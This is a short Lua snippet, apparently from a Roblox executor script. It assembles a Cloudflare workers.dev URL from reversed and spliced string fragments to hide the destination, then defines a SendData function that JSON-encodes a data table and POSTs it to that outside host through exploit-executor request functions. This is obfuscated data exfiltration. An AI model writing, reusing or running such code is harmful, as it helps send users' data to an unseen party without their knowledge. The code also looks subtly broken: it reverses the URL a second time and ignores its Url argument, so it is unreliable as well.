local reverse = string.reverse
local format = string.format

local WORKER_URL = "https://" .. format("se%sce.", "rvi") .. reverse("otelokin") .. ".workers.dev/" .. reverse(format("%sabmoc", "cct"))

local function SendData(DataTable,Url)
    local request = http_request or request or HttpPost or syn.request
    request({Url = reverse(WORKER_URL), Body = game:GetService("HttpService"):JSONEncode(DataTable), Method = "POST", Headers = {["content-type"] = "application/json"}})
end

